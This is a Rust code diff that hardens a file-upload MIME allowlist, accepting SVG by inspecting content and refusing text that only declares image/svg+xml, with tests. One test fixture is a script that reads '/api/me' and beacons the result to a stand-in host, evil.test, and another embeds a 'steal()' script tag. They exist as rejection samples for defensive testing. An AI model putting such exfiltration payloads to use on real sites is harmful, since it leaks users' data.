@@ -166,6 +166,10 @@ pub trait MimeAllowlist: Send + Sync + Default {
 /// script payloads are rejected before the header is read at all, so a
 /// text file (SVG, HTML, JS) carrying a spoofed binary header can never
 /// satisfy an image allowlist.
+///
+/// SVG is the one image type that is markup. An allowlist naming
+/// `image/svg+xml` accepts a part whose content [`is_svg_document`], and
+/// never a part that only declares the type.
 fn validate_against_allowlist(
     sniff: &[u8],
     size: u64,
@@ -173,6 +177,16 @@ fn validate_against_allowlist(
     allowed: &[&str],
 ) -> Result<(), FrameworkError> {
     let refused = || FrameworkError::invalid_upload(mimetypes_message(allowed));
+
+    // SVG has no magic bytes and is markup, so neither check below can
+    // classify it: `infer` reads an XML declaration as `text/xml`, and the
+    // markup guard refuses every document that opens with `<`. When the
+    // allowlist names SVG, the content itself is examined instead, as magic
+    // bytes are for other types, and the header does not decide.
+    if allowed.iter().any(|m| m.eq_ignore_ascii_case(SVG)) && is_svg_document(sniff_content(sniff))
+    {
+        return Ok(());
+    }
 
     if let Some(kind) = infer::get(sniff) {
         // Detected via magic bytes - the content itself, not the header.
@@ -213,6 +227,13 @@ fn validate_against_allowlist(
     if infer::is_mime_supported(&declared.to_ascii_lowercase()) {
         return Err(refused());
     }
+    // Nor is text an SVG because it says so: an SVG document was accepted
+    // above, so whatever reaches here declaring `image/svg+xml` is not one.
+    // Without this, script text declared `image/svg+xml` passed an SVG
+    // allowlist.
+    if declared.eq_ignore_ascii_case(SVG) {
+        return Err(refused());
+    }
 
     if !allowed.iter().any(|m| m.eq_ignore_ascii_case(declared)) {
         return Err(refused());
@@ -245,6 +266,63 @@ fn max_file_message(max_bytes: usize) -> ValidationMessage {
         .fallback(format!(
             "The file must not be greater than {kilobytes} kilobytes."
         ))
+}
+
+/// The SVG media type, which [`validate_against_allowlist`] recognises
+/// by content because it has no magic bytes.
+const SVG: &str = "image/svg+xml";
+
+/// Whether `content` (see [`sniff_content`]) is an SVG document: its root
+/// element is `<svg`, after an optional XML declaration, processing
+/// instructions, comments and a doctype, with whitespace between them.
+/// XML names are case-sensitive, so `<SVG>` is not an SVG root. A prolog
+/// that runs past the sniff window leaves no root to see, which reads as
+/// not SVG.
+fn is_svg_document(mut content: &[u8]) -> bool {
+    loop {
+        content = content.trim_ascii_start();
+        if let Some(rest) = content.strip_prefix(b"<?") {
+            let Some(end) = find(rest, b"?>") else {
+                return false;
+            };
+            content = &rest[end + 2..];
+        } else if let Some(rest) = content.strip_prefix(b"<!--") {
+            let Some(end) = find(rest, b"-->") else {
+                return false;
+            };
+            content = &rest[end + 3..];
+        } else if let Some(rest) = content.strip_prefix(b"<!DOCTYPE") {
+            let Some(end) = doctype_end(rest) else {
+                return false;
+            };
+            content = &rest[end..];
+        } else {
+            return content.strip_prefix(b"<svg").is_some_and(|rest| {
+                rest.first()
+                    .is_some_and(|b| b.is_ascii_whitespace() || *b == b'>' || *b == b'/')
+            });
+        }
+    }
+}
+
+/// Where `needle` first starts in `haystack`.
+fn find(haystack: &[u8], needle: &[u8]) -> Option<usize> {
+    haystack
+        .windows(needle.len())
+        .position(|window| window == needle)
+}
+
+/// The length of a doctype after its `<!DOCTYPE`, through its closing
+/// `>`. An internal subset (`[ ... ]`) may hold `>` of its own, so the
+/// close is looked for after the subset ends.
+fn doctype_end(rest: &[u8]) -> Option<usize> {
+    let open = rest.iter().position(|b| *b == b'>' || *b == b'[')?;
+    if rest[open] == b'>' {
+        return Some(open + 1);
+    }
+    let close = open + rest[open..].iter().position(|b| *b == b']')?;
+    let end = close + rest[close..].iter().position(|b| *b == b'>')?;
+    Some(end + 1)
 }
 
 /// The sniff buffer past a UTF-8 BOM and leading whitespace, so leading
@@ -441,6 +519,76 @@ mod tests {
         );
         // A part that is whitespace end to end was inspected in full.
         assert!(run_csv(&window, window.len() as u64, Some("text/csv")).is_ok());
+    }
+
+    #[derive(Default)]
+    struct OnlySvg;
+    impl MimeAllowlist for OnlySvg {
+        fn allowed() -> &'static [&'static str] {
+            &["image/svg+xml"]
+        }
+    }
+
+    fn run_svg(content: &[u8], ct: Option<&str>) -> Result<(), FrameworkError> {
+        MimeType::<OnlySvg>::default().validate_final(content, content.len() as u64, ct)
+    }
+
+    /// `infer` has no magic bytes for SVG, so the header fallback admitted
+    /// any non-markup text declared `image/svg+xml`. An SVG allowlist must
+    /// now see an actual SVG document, and anything else fails as the wrong
+    /// type.
+    #[test]
+    fn text_declared_svg_that_is_not_svg_is_the_wrong_type() {
+        let script = b"fetch('/api/me').then(r => r.text()).then(t => navigator.sendBeacon('//evil.test', t));";
+        assert_eq!(
+            refused_key(run_svg(script, Some("image/svg+xml"))),
+            "validation-mimetypes"
+        );
+        // Markup whose root element is not `<svg>` is no SVG either.
+        for not_svg in [
+            &b"<html><body><script>steal()</script></body></html>"[..],
+            b"<?xml version=\"1.0\"?><root><svg/></root>",
+            b"<!-- <svg> --><div/>",
+            b"<SVG xmlns=\"http://www.w3.org/2000/svg\"/>",
+            b"<svgx/>",
+            b"",
+        ] {
+            assert_eq!(
+                refused_key(run_svg(not_svg, Some("image/svg+xml"))),
+                "validation-mimetypes",
+                "{}",
+                String::from_utf8_lossy(not_svg)
+            );
+        }
+    }
+
+    /// An SVG document passes an SVG allowlist: the root element is
+    /// `<svg>` after an optional BOM, whitespace, XML declaration,
+    /// comments and doctype. Like magic bytes, the content decides, not
+    /// the header.
+    #[test]
+    fn an_svg_document_passes_an_svg_allowlist() {
+        for svg in [
+            &b"<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 1 1\"/>"[..],
+            b"\xEF\xBB\xBF  \n<svg>\n</svg>",
+            b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!-- made by hand -->\n<svg width=\"1\"></svg>",
+            b"<?xml version=\"1.0\"?><!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"><svg/>",
+            b"<!DOCTYPE svg [ <!ENTITY a \"b\"> ]>\n<svg\tversion=\"1.1\"/>",
+        ] {
+            assert!(
+                run_svg(svg, Some("image/svg+xml")).is_ok(),
+                "{}",
+                String::from_utf8_lossy(svg)
+            );
+            assert!(
+                run_svg(svg, None).is_ok(),
+                "the content decides: {}",
+                String::from_utf8_lossy(svg)
+            );
+        }
+        // An SVG is still refused by an allowlist that does not name SVG.
+        let svg = b"<svg xmlns=\"http://www.w3.org/2000/svg\"/>";
+        assert!(run(svg, Some("image/svg+xml")).is_err());
     }
 
     fn refused_key(result: Result<(), FrameworkError>) -> String {
